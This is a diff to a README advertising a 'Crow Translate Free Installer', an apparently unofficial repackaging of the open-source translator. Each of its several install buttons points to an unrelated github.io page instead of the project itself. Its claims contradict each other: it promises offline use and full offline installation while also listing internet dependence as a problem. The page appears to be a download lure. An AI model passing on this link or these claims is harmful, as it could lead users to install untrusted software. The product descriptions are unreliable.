@@ -8,7 +8,7 @@
   <img src="https://img.shields.io/badge/Category-Translation-E63946?style=for-the-badge&logo=appstore" />
 </p>
 
-**💻 Crow Translate Free Installer** — Crow Translate is a free, open-source desktop translator for Windows and Linux that translates selected text using Google, Yandex, or Bing translation APIs. Works without internet access, no account required. Full offline installation.
+**💻 Crow Translate Free Installer** — Crow Translate is a free, open-source translation application for Windows and Linux that provides quick access to Google, Yandex, Bing, and LibreTranslate engines. Works without internet access, no account required. Full offline installation.
 
 <p align="center">
   <img src="https://skillicons.dev/icons?i=windows" />
@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install Crow Translate](https://img.shields.io/badge/⬇_Install_Crow%20Translate-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Crow Translate](https://img.shields.io/badge/⬇_Install_Crow+Translate-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -30,16 +30,16 @@
 
 ## 📖 About Crow Translate
 
-Crow Translate is a free, open-source desktop translator for Windows and Linux that translates selected text using Google, Yandex, or Bing translation APIs. It provides a minimal interface, hotkey-triggered translation, and text-to-speech support.
+Crow Translate is a free, open-source translation application for Windows and Linux that provides quick access to Google, Yandex, Bing, and LibreTranslate engines. Translate selected text with a keyboard shortcut from any application, use text-to-speech for pronunciation, and maintain a translation history. Crow Translate's integration with the system clipboard makes it a fast translation tool for any workflow.
 
 ---
 
 ## ❌ Problem: Crow Translate is hard to access
 
-- **Windows and Linux Only** — No macOS version available
-- **API Dependency** — Requires API keys or uses public endpoints that may be rate-limited
-- **Translation Quality** — Output quality dependent on chosen translation service
-- **Internet Required** — All translation processed in cloud; no offline translation
+- **Limited Platforms** — Windows and Linux; no macOS version
+- **API Dependency** — Translation quality depends on connected translation services
+- **Internet Required** — All translation engines require internet connectivity except LibreTranslate with local server
+- **Privacy Consideration** — Translated text sent to third-party translation services
 
 ---
 
@@ -81,7 +81,7 @@ Crow Translate is a free, open-source desktop translator for Windows and Linux t
 
 <div align="center">
 
-[![⬇ Install Crow Translate](https://img.shields.io/badge/⬇_Install_Crow%20Translate-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Crow Translate](https://img.shields.io/badge/⬇_Install_Crow+Translate-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -121,11 +121,11 @@ Crow Translate is a free, open-source desktop translator for Windows and Linux t
 
 ---
 
-**Crow Translate Free Installer** — Crow Translate is a free, open-source desktop translator for Windows and Linux that translates selected text using Google, Yandex, or Bing translation APIs. Install without internet connection today!
+**Crow Translate Free Installer** — Crow Translate is a free, open-source translation application for Windows and Linux that provides quick access to Google, Yandex, Bing, and LibreTranslate engines. Install without internet connection today!
 
 <div align="center">
 
-[![⬇ Install Crow Translate](https://img.shields.io/badge/⬇_Install_Crow%20Translate-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Crow Translate](https://img.shields.io/badge/⬇_Install_Crow+Translate-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
